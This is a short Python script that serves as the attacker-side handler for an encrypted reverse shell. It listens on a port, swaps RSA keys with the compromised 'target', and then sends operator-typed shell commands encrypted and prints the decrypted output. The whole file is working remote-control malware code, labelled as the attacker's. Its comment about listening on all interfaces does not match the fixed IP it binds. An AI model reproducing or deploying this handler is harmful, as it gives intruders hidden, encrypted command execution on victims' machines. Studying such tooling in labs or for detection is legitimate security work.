# pylint: disable=bare-except, missing-docstring, import-error
import socket
from cryptidy import asymmetric_encryption

HOST = '10.0.2.4' # Listen on all network interfaces
PORT = 12345  # Choose a port number
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
binded = False
while not binded:
    try:
        s.bind((HOST, PORT))
        binded = True
    except OSError as e:
        # ignore
        pass

s.listen(1)
print(f"Listening on {HOST}:{PORT}")
conn, addr = s.accept()
print(f"Connection from {addr}")

priv_key, pub_key = asymmetric_encryption.generate_keys(2048)  # 2048 bits RSA key
print(f'attacker priv key: {priv_key}')
print(f'attacker pub key: {pub_key}')
conn.send(pub_key.encode())

target_pub_key = conn.recv(1024).decode()
print(f'target pub key: {target_pub_key}')

while True:
    command = input("Enter command to execute or 'exit' to quit: ")
    if command.lower() == 'exit':
        conn.send('exit'.encode())
        conn.close()
        break
    # conn.send(command.encode())
    conn.send(asymmetric_encryption.encrypt_message(command, target_pub_key))
    # output = conn.recv(1024).decode()
    encrypted_output = conn.recv(4096).decode()
    print(len(encrypted_output))
    _, output = asymmetric_encryption.decrypt_message(encrypted_output, priv_key)
    print(output, end="")
s.close()
